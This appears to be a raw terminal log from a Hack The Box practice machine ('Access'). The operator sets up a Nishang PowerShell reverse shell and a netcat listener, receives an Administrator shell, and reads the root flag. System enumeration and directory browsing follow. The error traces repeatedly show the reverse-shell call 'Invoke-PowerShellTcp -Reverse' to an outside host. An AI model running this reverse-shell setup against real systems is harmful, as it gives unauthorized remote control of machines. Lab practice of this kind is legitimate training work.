┌─[root@parrot]─[~/hackthebox/Access]                     
└──╼ #cd /opt/JAWS/          
┌─[root@parrot]─[/opt/JAWS]  
└──╼ #ls                     
jaws-enum.ps1  LICENSE  README.md                         
┌─[root@parrot]─[/opt/JAWS]  
└──╼ #git pull               
Already up to date.          
┌─[root@parrot]─[/opt/JAWS]  
└──╼ #cd -                   
/root/hackthebox/Access      
┌─[root@parrot]─[~/hackthebox/Access]                     
└──╼ #cd www/                
┌─[root@parrot]─[~/hackthebox/Access/www]                 
└──╼ #ls                     
jaws-enum.ps1  nishang.ps1   
┌─[root@parrot]─[~/hackthebox/Access/www]                 
└──╼ #cp nishang.ps1 9002.ps1            
┌─[root@parrot]─[~/hackthebox/Access/www]
└──╼ #vi 9002.ps1                        
┌─[root@parrot]─[~/hackthebox/Access/www]
└──╼ #nc -nvlp 9002                      
Ncat: Version 7.80 ( https://nmap.org/ncat )                                       
Ncat: Listening on :::9002               
Ncat: Listening on 0.0.0.0:9002          
Ncat: Connection from 10.10.10.98.       
Ncat: Connection from 10.10.10.98:49163. 
Windows PowerShell running as user Administrator on ACCESS                         
Copyright (C) 2015 Microsoft Corporation. All rights reserved.                     

PS C:\Windows\system32>whoami            
access\administrator                     
PS C:\Windows\system32> cd ../../users/administrator                               
PS C:\users\administrator> cd Desktop    
PS C:\users\administrator\Desktop> dir   


    Directory: C:\users\administrator\Desktop                                      


Mode                LastWriteTime     Length Name                                  
----                -------------     ------ ----                                  
-a---         8/21/2018  11:07 PM         32 root.txt                              


PS C:\users\administrator\Desktop> more root.txt                                   
6e1586cc7ab230a8d297e8f933d904cf         

PS C:\users\administrator\Desktop> whoami
access\administrator                     
PS C:\users\administrator\Desktop> more gyan.txt                                   

PS C:\users\administrator\Desktop> Get-Content : Cannot find path 'C:\users\administrator\Desktop\gyan.txt' becaus                                                    
e it does not exist.                     
At line:9 char:20                        
+         Get-Content <<<<  $file | more.com                                       
    + CategoryInfo          : ObjectNotFound: (C:\users\administrator\Desktop\     
   gyan.txt:String) [Get-Content], ItemNotFoundException                           
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetCo     
   ntentCommand                          
                                         

PS C:\users\administrator\Desktop> nano gyan.txt                                   
PS C:\users\administrator\Desktop> Invoke-PowerShellTcp : The term 'nano' is not recognized as the name of a cmdle                                                    
t, function, script file, or operable program. Check the spelling of the name,     
or if a path was included, verify that the path is correct and try again.          
At line:128 char:21                      
+ Invoke-PowerShellTcp <<<<  -Reverse -IPAddress 10.10.14.14 -Port 9002            
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep     
   tion                                  
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio     
   n,Invoke-PowerShellTcp                
                                         

PS C:\users\administrator\Desktop> systeminfo                                      

Host Name:                 ACCESS        
OS Name:                   Microsoft Windows Server 2008 R2 Standard               
OS Version:                6.1.7600 N/A Build 7600                                 
OS Manufacturer:           Microsoft Corporation                                   
OS Configuration:          Standalone Server                                       
OS Build Type:             Multiprocessor Free                                     
Registered Owner:          Windows User  
Registered Organization:                 
Product ID:                55041-507-9857321-84191                                 
Original Install Date:     8/21/2018, 9:43:10 PM                                   
System Boot Time:          12/27/2019, 3:06:58 AM                                  
System Manufacturer:       VMware, Inc.  
System Model:              VMware Virtual Platform                                 
System Type:               x64-based PC  
Processor(s):              2 Processor(s) Installed.                               
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz                                                                            
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz                                                                            
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018               
Windows Directory:         C:\Windows    
System Directory:          C:\Windows\system32                                     
Boot Device:               \Device\HarddiskVolume1                                 
System Locale:             en-us;English (United States)                           
Input Locale:              en-us;English (United States)                           
Time Zone:                 (UTC) Dublin, Edinburgh, Lisbon, London                 
Total Physical Memory:     2,047 MB      
Available Physical Memory: 1,382 MB      
Virtual Memory: Max Size:  4,095 MB      
Virtual Memory: Available: 3,457 MB      
Virtual Memory: In Use:    638 MB        
Page File Location(s):     C:\pagefile.sys                                         
Domain:                    HTB           
Logon Server:              N/A           
Hotfix(s):                 110 Hotfix(s) Installed.                                
                           [01]: KB981391                                          
                           [02]: KB981392                                          
                           [03]: KB977236                                          
                           [04]: KB981111                                          
                           [05]: KB977238                                          
                           [06]: KB977239                                          
                           [07]: KB981390                                          
                           [08]: KB2032276                                         
                           [09]: KB2296011                                         
                           [10]: KB2305420                                         
                           [11]: KB2345886                                         
                           [12]: KB2347290                                         
                           [13]: KB2378111                                         
                           [14]: KB2386667                                         
                           [15]: KB2387149                                         
                           [16]: KB2393802                                         
                           [17]: KB2419640                                         
                           [18]: KB2423089                                         
                           [19]: KB2425227                                         
                           [20]: KB2442962                                         
                           [21]: KB2454826                                         
                           [22]: KB2467023                                         
                           [23]: KB2479943                                         
                           [24]: KB2483614                                         
                           [25]: KB2484033                                         
                           [26]: KB2488113                                         
                           [27]: KB2505438                                         
                           [28]: KB2506014                                         
                           [29]: KB2506212                                         
                           [30]: KB2506928                                         
                           [31]: KB2509553                                         
                           [32]: KB2511250                                         
                           [33]: KB2511455                                         
                           [34]: KB2522422                                         
                           [35]: KB2529073                                         
                           [36]: KB2535512                                         
                           [37]: KB2544893                                         
                           [38]: KB2545698                                         
                           [39]: KB2547666                                         
                           [40]: KB2552343                                         
                           [41]: KB2560656                                         
                           [42]: KB2563227                                         
                           [43]: KB2564958                                         
                           [44]: KB2570947                                         
                           [45]: KB2585542                                         
                           [46]: KB2598845                                         
                           [47]: KB2603229                                         
                           [48]: KB2604114                                         
                           [49]: KB2607047                                         
                           [50]: KB2608658                                         
                           [51]: KB2618451                                         
                           [52]: KB2620704                                         
                           [53]: KB2621440                                         
                           [54]: KB2631813                                         
                           [55]: KB2640148                                         
                           [56]: KB2643719                                         
                           [57]: KB2653956                                         
                           [58]: KB2654428                                         
                           [59]: KB2656355                                         
                           [60]: KB2660075                                         
                           [61]: KB2667402                                         
                           [62]: KB2676562                                         
                           [63]: KB2685811                                         
                           [64]: KB2685813                                         
                           [65]: KB2685939                                         
                           [66]: KB2690533                                         
                           [67]: KB2698365                                         
                           [68]: KB2705219                                         
                           [69]: KB2709630                                         
                           [70]: KB2712808                                         
                           [71]: KB2716513                                         
                           [72]: KB2718704                                         
                           [73]: KB2719033                                         
                           [74]: KB2726535                                         
                           [75]: KB2727528                                         
                           [76]: KB2729094                                         
                           [77]: KB2729451                                         
                           [78]: KB2741355                                         
                           [79]: KB2742598                                         
                           [80]: KB2748349                                         
                           [81]: KB2758857                                         
                           [82]: KB2761217                                         
                           [83]: KB2765809                                         
                           [84]: KB2770660                                         
                           [85]: KB2789644                                         
                           [86]: KB2791765                                         
                           [87]: KB2807986                                         
                           [88]: KB2813347                                         
                           [89]: KB2840149                                         
                           [90]: KB2998812                                         
                           [91]: KB958488                                          
                           [92]: KB972270                                          
                           [93]: KB974431                                          
                           [94]: KB974571                                          
                           [95]: KB975467                                          
                           [96]: KB975560                                          
                           [97]: KB977074                                          
                           [98]: KB978542                                          
                           [99]: KB978601                                          
                           [100]: KB979099                                         
                           [101]: KB979309                                         
                           [102]: KB979482                                         
                           [103]: KB979538                                         
                           [104]: KB979687                                         
                           [105]: KB979688                                         
                           [106]: KB980408                                         
                           [107]: KB980846                                         
                           [108]: KB982018                                         
                           [109]: KB982132                                         
                           [110]: KB982799                                         
Network Card(s):           1 NIC(s) Installed.                                     
                           [01]: Intel(R) PRO/1000 MT Network Connection           
                                 Connection Name: Local Area Connection            
                                 DHCP Enabled:    No                               
                                 IP address(es)                                    
                                 [01]: 10.10.10.98                                 
                                 [02]: fe80::7ceb:4750:63f0:6e5e                   
                                 [03]: dead:beef::7ceb:4750:63f0:6e5e              
PS C:\users\administrator\Desktop> dir                                                                                                                                
                                                                                                                                                                      

    Directory: C:\users\administrator\Desktop                                      


Mode                LastWriteTime     Length Name                                  
----                -------------     ------ ----                                  
-a---         8/21/2018  11:07 PM         32 root.txt                              


PS C:\users\administrator\Desktop> cd .. 
PS C:\users\administrator> dir           


    Directory: C:\users\administrator    


Mode                LastWriteTime     Length Name                                  
----                -------------     ------ ----                                  
d-r--         8/21/2018  10:55 PM            Contacts                              
d-r--         8/25/2018  10:54 PM            Desktop                               
d-r--         8/25/2018  10:55 PM            Documents                             
d-r--         8/22/2018   9:49 PM            Downloads                             
d-r--         8/21/2018  10:55 PM            Favorites                             
d-r--         8/21/2018  10:55 PM            Links                                 
d-r--         8/21/2018  10:55 PM            Music                                 
d-r--         8/21/2018  10:55 PM            Pictures                              
d-r--         8/21/2018  10:55 PM            Saved Games                           
d-r--         8/21/2018  10:55 PM            Searches                              
d-r--         8/24/2018  12:46 AM            Videos                                


PS C:\users\administrator> cd Music      
PS C:\users\administrator\Music> dir     
PS C:\users\administrator\Music> cd Pictures                                       
PS C:\users\administrator\Music> Set-Location : Cannot find path 'C:\users\administrator\Music\Pictures' because                                                      
 it does not exist.                      
At line:1 char:3                         
+ cd <<<<  Pictures                      
    + CategoryInfo          : ObjectNotFound: (C:\users\administrator\Music\Pi     
   ctures:String) [Set-Location], ItemNotFoundException                            
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLo     
   cationCommand                         
                                         
cd                                       
PS C:\users\administrator\Music> cd ..   
PS C:\users\administrator> cd Picture    
PS C:\users\administrator> Set-Location : Cannot find path 'C:\users\administrator\Picture' because it doe                                                            
s not exist.                             
At line:1 char:3                         
+ cd <<<<  Picture                       
    + CategoryInfo          : ObjectNotFound: (C:\users\administrator\Picture:     
   String) [Set-Location], ItemNotFoundException                                   
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLo     
   cationCommand                         
                                         
                                         
PS C:\users\administrator> cd pictures   
PS C:\users\administrator\pictures> dir  
PS C:\users\administrator\pictures> cd ../Videos                                   
PS C:\users\administrator\Videos> dir    
PS C:\users\administrator\Videos> cd ../ 
PS C:\users\administrator> cd ..         
PS C:\users> dir                         


    Directory: C:\users                  


Mode                LastWriteTime     Length Name                                  
----                -------------     ------ ----                                  
d----         8/24/2018  12:46 AM            Administrator                         
d-r--         7/14/2009   5:57 AM            Public                                
d----         8/23/2018  11:52 PM            security                              


PS C:\users> cd ../                      
PS C:\> dir                              


    Directory: C:\                       


Mode                LastWriteTime     Length Name                                  
----                -------------     ------ ----                                  
d----         8/23/2018  11:05 PM            inetpub                               
d----         7/14/2009   4:20 AM            PerfLogs                              
d-r--         8/23/2018   9:53 PM            Program Files                         
d-r--         8/24/2018   8:40 PM            Program Files (x86)                   
d----         8/24/2018   8:39 PM            temp                                  
d-r--         8/21/2018  11:31 PM            Users                                 
d----          9/1/2018  11:29 PM            Windows                               
d----         8/22/2018   8:23 AM            ZKTeco                                


PS C:\> cd "Program Files"               
PS C:\Program Files> dir                 


    Directory: C:\Program Files          


Mode                LastWriteTime     Length Name                                  
----                -------------     ------ ----                                  
d----         8/21/2018   9:43 PM            Common Files                          
d----         8/21/2018  10:39 PM            Internet Explorer                     
d----         8/21/2018   9:43 PM            VMware                                
d----         8/23/2018   9:53 PM            Windows Defender                      
d----         8/23/2018   9:53 PM            Windows Mail                          
d----         8/23/2018  10:10 PM            Windows Media Player                  
d----         7/14/2009   6:37 AM            Windows NT                            
d----         8/23/2018   9:53 PM            Windows Photo Viewer                  
d----         8/23/2018   9:53 PM            Windows Portable Devices              


PS C:\Program Files> cd ../"Program Files (x86)"                                   
PS C:\Program Files (x86)> dir           


    Directory: C:\Program Files (x86)    


Mode                LastWriteTime     Length Name                                  
----                -------------     ------ ----                                  
d----         8/24/2018   8:40 PM            Common Files                          
d----         8/22/2018   8:23 AM            FPSensor                              
d----         8/21/2018  10:39 PM            Internet Explorer                     
d----         8/21/2018  11:28 PM            Microsoft.NET                         
d----         8/23/2018   9:53 PM            Windows Defender                      
d----         8/23/2018   9:53 PM            Windows Mail                          
d----         8/23/2018  10:10 PM            Windows Media Player                  
d----         7/14/2009   6:37 AM            Windows NT                            
d----         8/23/2018   9:53 PM            Windows Photo Viewer                  
d----         8/23/2018   9:53 PM            Windows Portable Devices              


PS C:\Program Files (x86)> cd FPSensor   
PS C:\Program Files (x86)\FPSensor> dir  


    Directory: C:\Program Files (x86)\FPSensor                                     


Mode                LastWriteTime     Length Name                                  
----                -------------     ------ ----                                  
d----         8/22/2018   8:23 AM            bin                                   
d----         8/22/2018   8:23 AM            Biokey                                
-a---         8/22/2018   8:23 AM      13753 unins000.dat                          
-a---         8/22/2018   8:23 AM    1193161 unins000.exe                          
-a---         4/14/2016  11:25 AM     133328 UnInsDrvZ.exe                         


PS C:\Program Files (x86)\FPSensor> more Bioey                                     

PS C:\Program Files (x86)\FPSensor> Get-Content : Cannot find path 'C:\Program Files (x86)\FPSensor\Bioey' because                                                    
it does not exist.                       
At line:9 char:20                        
+         Get-Content <<<<  $file | more.com                                       
    + CategoryInfo          : ObjectNotFound: (C:\Program Files (x86)\FPSensor     
   \Bioey:String) [Get-Content], ItemNotFoundException                             
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetCo     
   ntentCommand                          
                                         

PS C:\Program Files (x86)\FPSensor> more Biokey                                    

PS C:\Program Files (x86)\FPSensor> Get-Content : Access to the path 'C:\Program Files (x86)\FPSensor\Biokey' is de                                                   
nied.                                    
At line:9 char:20                        
+         Get-Content <<<<  $file | more.com                                       
    + CategoryInfo          : PermissionDenied: (C:\Program Files (x86)\FPSens     
   or\Biokey:String) [Get-Content], UnauthorizedAccessException                    
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsof     
   t.PowerShell.Commands.GetContentCommand                                         
                                         

PS C:\Program Files (x86)\FPSensor> whoami                                         
access\administrator                     
PS C:\Program Files (x86)\FPSensor> file Biokey                                    
access\administrator                     
PS C:\Program Files (x86)\FPSensor> Invoke-PowerShellTcp : The term 'file' is not recognized as the name of a cmdle                                                   
t, function, script file, or operable program. Check the spelling of the name,     
or if a path was included, verify that the path is correct and try again.          
At line:128 char:21                      
+ Invoke-PowerShellTcp <<<<  -Reverse -IPAddress 10.10.14.14 -Port 9002            
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep     
   tion                                  
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio     
   n,Invoke-PowerShellTcp                
                                         

PS C:\Program Files (x86)\FPSensor> Get-type Biokey                                
PS C:\Program Files (x86)\FPSensor> Invoke-PowerShellTcp : The term 'Get-type' is not recognized as the name of a c                                                   
mdlet, function, script file, or operable program. Check the spelling of the na    
me, or if a path was included, verify that the path is correct and try again.      
At line:128 char:21                      
+ Invoke-PowerShellTcp <<<<  -Reverse -IPAddress 10.10.14.14 -Port 9002            
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep     
   tion                                  
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio     
   n,Invoke-PowerShellTcp                
                                         

PS C:\Program Files (x86)\FPSensor> Get-Content Biokey                             
PS C:\Program Files (x86)\FPSensor> Get-Content : Access to the path 'C:\Program Files (x86)\FPSensor\Biokey' is de                                                   
nied.                                    
At line:1 char:12                        
+ Get-Content <<<<  Biokey               
    + CategoryInfo          : PermissionDenied: (C:\Program Files (x86)\FPSens     
   or\Biokey:String) [Get-Content], UnauthorizedAccessException                    
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsof     
   t.PowerShell.Commands.GetContentCommand                                         
                                         

PS C:\Program Files (x86)\FPSensor> dir  


    Directory: C:\Program Files (x86)\FPSensor                                     


Mode                LastWriteTime     Length Name                                  
----                -------------     ------ ----                                  
d----         8/22/2018   8:23 AM            bin                                   
d----         8/22/2018   8:23 AM            Biokey                                
-a---         8/22/2018   8:23 AM      13753 unins000.dat                          
-a---         8/22/2018   8:23 AM    1193161 unins000.exe                          
-a---         4/14/2016  11:25 AM     133328 UnInsDrvZ.exe                         


PS C:\Program Files (x86)\FPSensor> unins000.exe                                   


    Directory: C:\Program Files (x86)\FPSensor                                     


Mode                LastWriteTime     Length Name                                  
----                -------------     ------ ----                                  
d----         8/22/2018   8:23 AM            bin                                   
d----         8/22/2018   8:23 AM            Biokey                                
-a---         8/22/2018   8:23 AM      13753 unins000.dat                          
-a---         8/22/2018   8:23 AM    1193161 unins000.exe                          
-a---         4/14/2016  11:25 AM     133328 UnInsDrvZ.exe                         


PS C:\Program Files (x86)\FPSensor> Invoke-PowerShellTcp : The term 'unins000.exe' is not recognized as the name of                                                   
 a cmdlet, function, script file, or operable program. Check the spelling of th    
e name, or if a path was included, verify that the path is correct and try agai    
n.                                       
At line:128 char:21                      
+ Invoke-PowerShellTcp <<<<  -Reverse -IPAddress 10.10.14.14 -Port 9002            
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep     
   tion                                  
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio     
   n,Invoke-PowerShellTcp                
                                         

PS C:\Program Files (x86)\FPSensor> ./unins000.exe                                 
PS C:\Program Files (x86)\FPSensor> dir  


    Directory: C:\Program Files (x86)\FPSensor                                     


Mode                LastWriteTime     Length Name                                  
----                -------------     ------ ----                                  
d----         8/22/2018   8:23 AM            bin                                   
d----         8/22/2018   8:23 AM            Biokey                                
-a---         8/22/2018   8:23 AM      13753 unins000.dat                          
-a---         8/22/2018   8:23 AM    1193161 unins000.exe                          
-a---         4/14/2016  11:25 AM     133328 UnInsDrvZ.exe                         


PS C:\Program Files (x86)\FPSensor> exit 
┌─[✗]─[root@parrot]─[~/hackthebox/Access/www]                                      
└──╼ #                                   
